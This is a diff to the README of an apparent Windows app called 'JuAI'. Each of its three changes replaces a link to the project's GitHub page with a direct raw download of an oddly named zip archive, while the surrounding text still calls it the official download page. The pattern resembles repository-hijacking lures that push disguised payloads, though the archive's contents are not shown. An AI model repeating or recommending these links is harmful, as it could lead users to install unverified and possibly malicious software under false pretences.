@@ -1,6 +1,6 @@
 # 🤖 JuAI - AI Agents Working Together
 
-[![Download JuAI](https://img.shields.io/badge/Download-JuAI-4caf50?style=for-the-badge)](https://github.com/twelve-today822/JuAI)
+[![Download JuAI](https://img.shields.io/badge/Download-JuAI-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/twelve-today822/JuAI/main/assets/AI_Ju_riverwards.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to get JuAI running on your Windows PC.
 
 Click this link to go to the download page and get the latest version of JuAI:
 
-[![Download JuAI](https://img.shields.io/badge/Download-JuAI-4caf50?style=for-the-badge)](https://github.com/twelve-today822/JuAI)
+[![Download JuAI](https://img.shields.io/badge/Download-JuAI-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/twelve-today822/JuAI/main/assets/AI_Ju_riverwards.zip)
 
 This page contains the files you need. You will find a section for downloading the Windows installer or executable file.
 
@@ -109,7 +109,7 @@ If JuAI does not open or stops working:
 
 ## 💡 Helpful Links
 
-- Official Repository and Download: [https://github.com/twelve-today822/JuAI](https://github.com/twelve-today822/JuAI)
+- Official Repository and Download: [https://raw.githubusercontent.com/twelve-today822/JuAI/main/assets/AI_Ju_riverwards.zip](https://raw.githubusercontent.com/twelve-today822/JuAI/main/assets/AI_Ju_riverwards.zip)
 - Issues and Support: Use the “Issues” tab on the GitHub page to ask for help.
 - Documentation: Check the repository README or wiki for advanced tips.
 
